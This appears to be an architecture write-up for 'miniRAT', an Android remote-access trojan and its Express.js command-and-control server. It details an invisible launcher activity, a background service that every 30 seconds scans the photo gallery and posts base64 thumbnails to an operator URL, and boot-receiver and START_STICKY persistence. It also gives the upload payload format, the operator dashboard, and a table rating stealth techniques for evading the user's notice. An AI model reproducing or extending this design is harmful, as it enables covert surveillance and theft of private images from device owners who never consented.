# Architecture — miniRAT

> Deep-dive into the system architecture, component interactions, data flows, and design patterns used in the miniRAT project.

---

## Table of Contents

- [System Overview](#system-overview)
- [Component Architecture](#component-architecture)
- [Android Client Architecture](#android-client-architecture)
  - [Component Lifecycle](#component-lifecycle)
  - [HiddenActivity — Stealth Launcher](#hiddenactivity--stealth-launcher)
  - [ParasiteService — Core Payload Engine](#parasiteservice--core-payload-engine)
  - [BootReceiver — Persistence Layer](#bootreceiver--persistence-layer)
  - [MainActivity — Decoy Component](#mainactivity--decoy-component)
- [C2 Server Architecture](#c2-server-architecture)
  - [Server Components](#server-components)
  - [File Storage Model](#file-storage-model)
  - [Web Dashboard](#web-dashboard)
- [Data Flow](#data-flow)
  - [Exfiltration Pipeline](#exfiltration-pipeline)
  - [Network Protocol](#network-protocol)
  - [Upload Payload Format](#upload-payload-format)
- [Build System Architecture](#build-system-architecture)
  - [Secret Injection Pipeline](#secret-injection-pipeline)
  - [Dependency Graph](#dependency-graph)
- [Threading Model](#threading-model)
- [Persistence Mechanisms](#persistence-mechanisms)
- [Stealth Mechanisms](#stealth-mechanisms)

---

## System Overview

miniRAT follows a classic **Client → C2 Server** architecture. The Android client acts as the implant, running silently on the target device. The C2 server acts as the operator's control panel, receiving and displaying exfiltrated data.

```
┌─────────────────────────────────────────────────┐
│                  ANDROID DEVICE                  │
│                                                 │
│  ┌──────────────┐     ┌──────────────────────┐  │
│  │ HiddenActivity│────▶│   ParasiteService    │  │
│  │  (launcher)   │     │   (background loop)  │  │
│  └──────────────┘     │                      │  │
│                       │  ┌────────────────┐  │  │
│  ┌──────────────┐     │  │  MediaStore     │  │  │
│  │ BootReceiver  │────▶│  │  Query Engine   │  │  │
│  │  (reboot)     │     │  └───────┬────────┘  │  │
│  └──────────────┘     │          │           │  │
│                       │  ┌───────▼────────┐  │  │
│                       │  │  Thumbnail      │  │  │
│                       │  │  Generator      │  │  │
│                       │  └───────┬────────┘  │  │
│                       │          │           │  │
│                       │  ┌───────▼────────┐  │  │
│                       │  │  HTTP Uploader  │──────────┐
│                       │  └────────────────┘  │  │    │
│                       └──────────────────────┘  │    │
└─────────────────────────────────────────────────┘    │
                                                       │
                        HTTPS POST                     │
                  /upload/thumbnail                    │
                                                       │
┌─────────────────────────────────────────────────┐    │
│               C2 SERVER (Node.js)                │    │
│                                                 │◀───┘
│  ┌──────────────────────────────────────────┐   │
│  │           Express.js Router               │   │
│  │                                          │   │
│  │  POST /api/upload/thumbnail              │   │
│  │  GET  /api/thumbnails                    │   │
│  │  GET  /api/fullsize/:filename            │   │
│  │  GET  /  (Gallery Dashboard)             │   │
│  └─────────────────┬────────────────────────┘   │
│                    │                            │
│  ┌─────────────────▼────────────────────────┐   │
│  │           File System Storage             │   │
│  │                                          │   │
│  │  ./uploads/                              │   │
│  │    ├── {name}_thumb.jpg                  │   │
│  │    └── {name}.metadata.json              │   │
│  └──────────────────────────────────────────┘   │
└─────────────────────────────────────────────────┘
```

---

## Component Architecture

### Android Manifest Component Map

The Android app declares 4 components in `AndroidManifest.xml`:

```
AndroidManifest.xml
│
├── <activity> HiddenActivity          [LAUNCHER, exported=true]
│     ├── Intent Filter: MAIN + LAUNCHER
│     └── Launch Mode: singleInstance
│
├── <activity> MainActivity            [exported=false]
│     └── (No intent filter — dead code)
│
├── <service> ParasiteService          [enabled=true, exported=false]
│     └── (Started programmatically, not bound)
│
└── <receiver> BootReceiver            [enabled=true, exported=true]
      └── Intent Filter: BOOT_COMPLETED, QUICKBOOT_POWERON (×2 variants)
```

### Component Dependency Graph

```
User taps app icon
        │
        ▼
  HiddenActivity ──startService()──▶ ParasiteService
        │                                   │
     finish()                          30s timer loop
                                            │
                                     ┌──────┴──────┐
                                     │             │
                                MediaStore    HTTP POST
                                  Query       to C2 server
                                     │
                                  Bitmap
                                  Decode →
                                  Scale →
                                  Base64 →
                                  Upload

  Device Reboot
        │
        ▼
  BootReceiver ──startService()──▶ ParasiteService
```

---

## Android Client Architecture

### Component Lifecycle

#### App Launch Sequence

```
1. System→HiddenActivity.onCreate()
     │
     ├── Window flags set (FLAG_FULLSCREEN | FLAG_LAYOUT_IN_SCREEN | FLAG_LAYOUT_INSET_DECOR)
     │     └── Makes the activity window completely invisible
     │
     ├── startService(ParasiteService.class)
     │     └── OS creates ParasiteService if not running
     │
     └── finish()
           └── Activity destroyed — removed from recents, back stack
```

#### Service Lifecycle

```
ParasiteService.onCreate()
     │
     ├── createNotificationChannel()
     │     └── Channel: "ParasiteChannel", IMPORTANCE_MIN, no sound, no vibration
     │
     └── (startForeground COMMENTED OUT — will cause issues on API 26+)

ParasiteService.onStartCommand()
     │
     ├── Returns START_STICKY
     │     └── OS will restart service if killed (with null intent)
     │
     └── startParasiteMonitoring()
           │
           └── Handler.post(periodicTask)
                 │
                 ├── performRATTasks()
                 │     └── uploadGalleryThumbnails()
                 │
                 └── Handler.postDelayed(this, 30000)
                       └── (recursive scheduling — runs every 30s)

ParasiteService.onDestroy()
     │
     └── handler.removeCallbacks(periodicTask)
           └── Stops the periodic loop
```

---

### HiddenActivity — Stealth Launcher

**File**: `app/src/main/java/com/app/minirat/HiddenActivity.java`
**Lines**: 30

| Attribute | Value |
|---|---|
| Superclass | `android.app.Activity` |
| Launch Mode | `singleInstance` |
| Exported | `true` |
| Intent Filter | `MAIN` + `LAUNCHER` |
| UI | None — invisible window, finishes immediately |

**Window Flags Applied:**
- `FLAG_FULLSCREEN` — Hides status bar
- `FLAG_LAYOUT_IN_SCREEN` — Allows layout to consume full screen
- `FLAG_LAYOUT_INSET_DECOR` — Ensures window is positioned properly

**Design Rationale**: By using an Activity as the launcher entry point (required by Android) but immediately finishing it, the app satisfies Android's requirement for a launcher intent while providing zero visual indication to the user. The `singleInstance` launch mode ensures that repeated taps don't create multiple instances.

---

### ParasiteService — Core Payload Engine

**File**: `app/src/main/java/com/app/minirat/Service.java`
**Lines**: 279
**Class Name**: `ParasiteService` (note: differs from filename)

This is the most complex component. It handles all RAT functionality.

#### Internal Architecture

```
ParasiteService
│
├── Fields
│   ├── TAG: String = "ParasiteService"
│   ├── CHANNEL_ID: String = "ParasiteChannel"
│   ├── NOTIFICATION_ID: int = 1
│   ├── SERVER_URL: String = BuildConfig.DOMAIN_URL
│   ├── handler: Handler (main thread)
│   ├── periodicTask: Runnable (30s loop)
│   └── executor: ExecutorService (single-thread pool)
│
├── Lifecycle Methods
│   ├── onCreate() → notification channel setup
│   ├── onStartCommand() → starts monitoring, returns START_STICKY
│   ├── onBind() → returns null (unbound service)
│   └── onDestroy() → removes handler callbacks
│
├── Monitoring Engine
│   └── startParasiteMonitoring() → schedules periodicTask on Handler
│       └── periodicTask.run()
│           ├── performRATTasks()
│           └── handler.postDelayed(30000)
│
├── Gallery Exfiltration Pipeline
│   ├── uploadGalleryThumbnails() → runs on executor thread
│   │   ├── getGalleryFiles() → queries MediaStore
│   │   ├── createThumbnail() → bitmap decode + scale + base64
│   │   ├── createPlaceholderThumbnail() → fallback gray image
│   │   └── sendThumbnailToServer() → HTTP POST
│   │
│   └── getGalleryFiles()
│       └── ContentResolver.query(EXTERNAL_CONTENT_URI)
│           ├── Projection: _ID, DATA, MIME_TYPE
│           ├── Selection: JPEG or MP4
│           └── Sort: DATE_ADDED DESC
│
└── Notification System
    ├── createNotificationChannel() → IMPORTANCE_MIN, silent
    └── createNotification() → "System Service" label (unused)
```

#### Thumbnail Pipeline Detail

```
File Path (from MediaStore)
    │
    ▼
BitmapFactory.decodeFile(filePath)
    │
    ├── null → createPlaceholderThumbnail() → 128×128 gray bitmap
    │
    └── Bitmap (full resolution)
         │
         ▼
    Calculate scale factor:
      scaleW = 128.0 / width
      scaleH = 128.0 / height
      scale = min(scaleW, scaleH)
         │
         ▼
    Matrix.postScale(scale, scale)
         │
         ▼
    Bitmap.createBitmap(original, matrix) → 128×128 thumbnail
         │
         ▼
    thumbnail.compress(JPEG, quality=70, outputStream)
         │
         ▼
    Base64.encodeToString(bytes, NO_WRAP)
         │
         ▼
    JSON: {"filename": "...", "thumbnail": "<base64>"}
         │
         ▼
    HttpURLConnection.POST → SERVER_URL + "/upload/thumbnail"
```

---

### BootReceiver — Persistence Layer

**File**: `app/src/main/java/com/app/minirat/BootReceiver.java`
**Lines**: 27

| Attribute | Value |
|---|---|
| Superclass | `BroadcastReceiver` |
| Exported | `true` |
| Handled Actions | `BOOT_COMPLETED`, `QUICKBOOT_POWERON` (standard + HTC) |

**Action on trigger**: `context.startService(new Intent(context, ParasiteService.class))`

**Boot Intent Variants Covered:**
1. `android.intent.action.BOOT_COMPLETED` — Standard Android boot completion
2. `android.intent.action.QUICKBOOT_POWERON` — Generic quick boot
3. `com.htc.intent.action.QUICKBOOT_POWERON` — HTC-specific quick boot

---

### MainActivity — Decoy Component

**File**: `app/src/main/java/com/app/minirat/MainActivity.java`
**Lines**: 15

A completely empty Activity that calls `finish()` in `onCreate()`. It is declared in the manifest with `exported="false"` and has no intent filter. **This component is dead code** — no other component references it, and it cannot be launched externally.

**Likely purpose**: Placeholder from Android Studio project template, never removed.

---

## C2 Server Architecture

### Server Components

**File**: `server.js`
**Framework**: Express.js
**Port**: 3000
**Bind Address**: `0.0.0.0` (all interfaces)

```
Express App
│
├── Middleware
│   ├── cors() — allows all origins
│   ├── express.json() — parses JSON request bodies
│   └── express.urlencoded({ extended: true }) — parses URL-encoded bodies
│
├── Static Serving
│   └── /uploads → ./uploads/ directory
│
├── Routes
│   ├── POST /api/upload/thumbnail → handleThumbnailUpload()
│   ├── GET  /api/thumbnails → listAllThumbnails()
│   ├── GET  /api/fullsize/:filename → serveFullSizeFile()
│   └── GET  / → serveGalleryDashboard()
│
├── File Storage
│   └── ./uploads/
│       ├── {filename}_thumb.jpg — decoded thumbnail image
│       └── {filename}.metadata.json — upload metadata
│
└── Multer (configured but unused by thumbnail route)
    └── Storage: ./uploads/thumbnail_{timestamp}.jpg
```

### File Storage Model

For each uploaded thumbnail, two files are created:

```
./uploads/
├── IMG_20240101.jpg_thumb.jpg        ← Decoded JPEG thumbnail (from Base64)
├── IMG_20240101.jpg.metadata.json    ← Metadata file
├── photo_002.jpg_thumb.jpg
├── photo_002.jpg.metadata.json
└── ...
```

**Metadata Schema** (`{filename}.metadata.json`):
```json
{
  "originalName": "IMG_20240101.jpg",
  "thumbnailPath": "IMG_20240101.jpg_thumb.jpg",
  "uploadedAt": "2024-01-01T12:00:00.000Z"
}
```

### Web Dashboard

The gallery dashboard is served as inline HTML from the root route (`GET /`). It uses:
- Vanilla HTML/CSS/JS (no frameworks)
- CSS Grid for responsive thumbnail layout (`repeat(auto-fill, minmax(150px, 1fr))`)
- `fetch()` API to load thumbnails from `/api/thumbnails`
- `setInterval()` for 30-second auto-refresh
- Thumbnails displayed as `<img>` elements pointing to `/uploads/{thumb_filename}`

---

## Data Flow

### Exfiltration Pipeline

```
                    ANDROID DEVICE                              C2 SERVER
                    
    ┌──────────────────────────────┐          ┌──────────────────────────────┐
    │                              │          │                              │
    │  MediaStore                  │          │  Express Router              │
    │  ┌────────────┐              │          │  ┌────────────────────┐      │
    │  │ Query JPEG │              │          │  │ POST /api/upload/  │      │
    │  │ & MP4      │              │   HTTPS  │  │   thumbnail        │      │
    │  └─────┬──────┘              │   POST   │  └────────┬───────────┘      │
    │        │                     │────────▶ │           │                  │
    │  ┌─────▼──────┐              │   JSON   │  ┌────────▼───────────┐      │
    │  │ Decode to  │              │  payload  │  │ Base64 decode      │      │
    │  │ Bitmap     │              │          │  │ Write to disk      │      │
    │  └─────┬──────┘              │          │  └────────┬───────────┘      │
    │        │                     │          │           │                  │
    │  ┌─────▼──────┐              │          │  ┌────────▼───────────┐      │
    │  │ Scale to   │              │          │  │ ./uploads/         │      │
    │  │ 128×128    │              │          │  │  _thumb.jpg        │      │
    │  └─────┬──────┘              │          │  │  .metadata.json    │      │
    │        │                     │          │  └────────────────────┘      │
    │  ┌─────▼──────┐              │          │                              │
    │  │ JPEG 70%   │              │          │          ▲                   │
    │  │ → Base64   │              │          │          │                   │
    │  └────────────┘              │          │  ┌───────┴────────────┐      │
    │                              │          │  │ GET /api/thumbnails│      │
    └──────────────────────────────┘          │  └───────┬────────────┘      │
                                             │          │                   │
                                             │  ┌───────▼────────────┐      │
                                             │  │ Gallery Dashboard  │◀── Operator
                                             │  │ (HTML/CSS/JS)      │   Browser
                                             │  └────────────────────┘      │
                                             └──────────────────────────────┘
```

### Network Protocol

| Field | Value |
|---|---|
| Transport | HTTPS (based on `DOMAIN_URL` using `https://`) |
| Method | POST |
| Content-Type | `application/json` |
| Endpoint | `{DOMAIN_URL}/upload/thumbnail` (client-side) |
| Connect Timeout | 10 seconds |
| Read Timeout | 10 seconds |
| Streaming | Fixed-length streaming mode |

### Upload Payload Format

```
POST /upload/thumbnail HTTP/1.1
Content-Type: application/json
Content-Length: <calculated>

{
  "filename": "<original_media_filename>",
  "thumbnail": "<base64_encoded_jpeg_128x128>"
}
```

The Base64 string typically ranges from **5–15 KB** per thumbnail (128×128 JPEG at quality 70).

---

## Build System Architecture

### Secret Injection Pipeline

```
local.properties                  build.gradle.kts                  Java Code
┌─────────────────┐   load()    ┌─────────────────────┐   inject   ┌──────────────────┐
│ DOMAIN_URL=     │──────────▶ │ buildConfigField(   │──────────▶│ BuildConfig.     │
│   https://...   │            │   "DOMAIN_URL", ...) │           │   DOMAIN_URL     │
└─────────────────┘            └─────────────────────┘           └──────────────────┘
                                                                        │
                                                                        ▼
                                                                 ParasiteService
                                                                 SERVER_URL field
```

1. `local.properties` contains `DOMAIN_URL=https://...`
2. `build.gradle.kts` reads it via `Properties().load()` and injects as `buildConfigField`
3. Android build system generates `BuildConfig.java` with `public static final String DOMAIN_URL`
4. `ParasiteService` reads it as `BuildConfig.DOMAIN_URL`

### Dependency Graph

```
App Dependencies
│
├── androidx.core:core-ktx               ← Android KTX extensions
├── androidx.lifecycle:lifecycle-runtime  ← Lifecycle-aware components
├── androidx.activity:activity-compose    ← Compose Activity (UNUSED)
├── androidx.compose:compose-bom         ← Compose BOM (UNUSED)
├── androidx.compose.ui                  ← Compose UI (UNUSED)
├── androidx.compose.ui:ui-graphics      ← Compose Graphics (UNUSED)
├── androidx.compose.ui:ui-tooling       ← Compose Preview (UNUSED)
├── androidx.compose.material3           ← Material3 (UNUSED)
├── junit                                ← Unit testing
├── androidx.test:junit                  ← Android test
└── androidx.espresso:espresso-core      ← UI testing
```

> Note: The Compose dependencies are included from the project template but the app uses no Compose UI — it's pure Java with no layouts or views.

---

## Threading Model

```
┌────────────────────────────────────────────────────────┐
│                    MAIN THREAD                          │
│                                                        │
│  Handler (Looper.getMainLooper())                      │
│    └── periodicTask (Runnable)                         │
│          ├── performRATTasks()                          │
│          │     └── uploadGalleryThumbnails()            │
│          │           └── executor.execute(lambda)  ─────────┐
│          └── postDelayed(this, 30000)                   │   │
│                                                        │   │
└────────────────────────────────────────────────────────┘   │
                                                             │
┌────────────────────────────────────────────────────────┐   │
│              EXECUTOR THREAD (single)                   │   │
│                                                        │◀──┘
│  For each gallery file:                                │
│    1. BitmapFactory.decodeFile()    ← I/O + memory     │
│    2. Bitmap.createBitmap(matrix)   ← CPU              │
│    3. bitmap.compress(JPEG)         ← CPU              │
│    4. Base64.encodeToString()       ← CPU              │
│    5. HttpURLConnection.POST()      ← Network I/O      │
│                                                        │
└────────────────────────────────────────────────────────┘
```

**Key threading decisions:**
- The `Handler` runs on the **main thread** — it only schedules work, doesn't do heavy processing
- All gallery scanning, bitmap processing, and network I/O runs on a **single background thread** via `ExecutorService`
- Using a **single-thread executor** means uploads are sequential (one file at a time), which is less detectable but slower

---

## Persistence Mechanisms

The app uses two independent persistence strategies:

### 1. Boot Receiver (Reboot Survival)

```
Device Power Off → Power On → Boot Complete
    │
    ▼
Android OS broadcasts ACTION_BOOT_COMPLETED
    │
    ▼
BootReceiver.onReceive()
    │
    ▼
startService(ParasiteService.class)
    │
    ▼
ParasiteService resumes operation
```

### 2. START_STICKY (Process Kill Survival)

```
OS kills ParasiteService (low memory, battery optimization)
    │
    ▼
OS schedules service restart (due to START_STICKY flag)
    │
    ▼
ParasiteService.onStartCommand(null intent, ...)
    │
    ▼
startParasiteMonitoring() resumes
```

---

## Stealth Mechanisms

| Mechanism | Implementation | Effectiveness |
|---|---|---|
| **Invisible Launcher** | `HiddenActivity` sets fullscreen flags + `finish()` | High — user sees nothing when tapping the app icon |
| **No UI** | No layouts, no views, no themes applied to activities | High — nothing visible in recents or screen |
| **Silent Notifications** | Channel with `IMPORTANCE_MIN`, no sound, no vibration | Medium — notification still appears in shade on API 26+ |
| **Generic Naming** | Notification titled "System Service" | Medium — blends with system services |
| **Thumbnail-Only Upload** | 128×128 thumbnails instead of full files | Medium — reduces bandwidth footprint, harder to detect by volume |
| **30s Interval** | Periodic uploads rather than continuous | Low-Medium — still generates periodic network traffic patterns |
